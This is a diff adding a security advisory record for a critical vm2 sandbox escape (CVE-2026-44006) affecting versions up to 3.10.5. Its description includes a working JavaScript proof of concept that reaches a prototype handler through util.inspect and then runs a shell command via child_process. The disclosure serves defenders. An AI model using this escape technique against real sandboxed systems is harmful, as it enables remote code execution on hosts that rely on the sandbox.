@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-07T03:54:36Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 353800,
+    "Id": "GSA_kwCzR0hTQS1xY3A0LXYyamotZmp4OM4ABWYI",
+    "GhsaId": "GHSA-qcp4-v2jj-fjx8",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-qcp4-v2jj-fjx8"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-qcp4-v2jj-fjx8"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-qcp4-v2jj-fjx8"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44006"
+      }
+    ],
+    "Description": "### Summary\n\nIt is possible to reach `BaseHandler.getPrototypeOf`, which can be used to get arbitrary prototypes\n\n### Details\n\nhttps://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658\n\n`BaseHandler` can be reached via `util.inspect` (same as https://github.com/patriksimek/vm2/commit/57971fa423abeb66f09e47e18102986549474ca8)\n\n### PoC\n```js\nlet obj = {\n\tsubarray: Buffer.prototype.inspect,\n\tslice: Buffer.prototype.slice,\n\thexSlice: () =\u003e '',\n};\n\nlet sym;\n\nobj.slice(10, {\n\tshowHidden: true,\n\tshowProxy: true,\n\tdepth: 10,\n\tstylize(a) {\n\t\tconst handler = this.seen \u0026\u0026 this.seen[1];\n\n\t\tif (handler \u0026\u0026 handler.getPrototypeOf) {\n\t\t\tgP = handler.getPrototypeOf;\n\t\t\tHObjectProto = gP(gP(gP(gP(Buffer))));\n\t\t\tHObject = HObjectProto.constructor;\n\t\t\tsym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);\n\t\t}\n\t\treturn a;\n\t},\n});\n\nobj = {\n\t[sym]: (depth, opt, inspect) =\u003e {\n\t\tinspect.constructor('return process')()\n\t\t.getBuiltinModule('child_process')\n\t\t.execSync('id', { stdio: 'inherit' });\n\t},\n\tvalueOf: undefined,\n\tconstructor: undefined,\n};\n\nWebAssembly.compileStreaming(obj).catch(() =\u003e {});\n```\n\n### Impact\nSandbox Escape -\u003e RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-07T03:54:34Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has a Sandbox Escape Vulnerability",
+    "UpdatedAt": "2026-05-07T03:55:02Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.0"
+      },
+      "VulnerableVersionRange": "\u003c= 3.10.5"
+    }
+  ]
+}
